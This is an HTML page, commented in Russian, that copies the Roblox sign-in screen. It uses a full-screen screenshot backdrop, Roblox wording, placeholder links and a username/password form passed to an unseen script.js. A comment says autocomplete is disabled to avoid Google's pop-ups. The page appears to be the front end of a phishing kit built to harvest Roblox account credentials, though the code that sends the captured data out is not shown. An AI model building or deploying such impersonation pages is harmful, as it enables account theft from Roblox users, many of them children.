<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Твой скриншот на весь экран -->
    <img src="bg.jpg" class="fullscreen-bg" alt="bg">

    <div class="login-container">
        <h1>Войти в Roblox</h1>
        
        <!-- autocomplete="off" и new-password отключают навязчивые окна Google -->
        <form id="loginForm" autocomplete="off">
            <input type="text" id="username" name="login_username" placeholder="Имя пользователя/Электронная почта/Телефон" required autocomplete="off">
            <input type="password" id="password" name="login_password" placeholder="Пароль" required autocomplete="new-password">
            <button type="submit" class="login-btn">Авторизоваться</button>
        </form>

        <div class="forgot-password">
            <a href="#">Забыли пароль или имя пользователя?</a>
        </div>

        <div class="divider"></div>

        <div class="login-options">
            <button class="secondary-btn">Отправить мне одноразовый код по электронной почте</button>
            <button class="secondary-btn">Быстрый вход</button>
            <button class="secondary-btn">Другие варианты входа в систему</button>
        </div>

        <div class="footer-text">
            У вас нет аккаунта? <a href="#">Зарегистрируйтесь</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
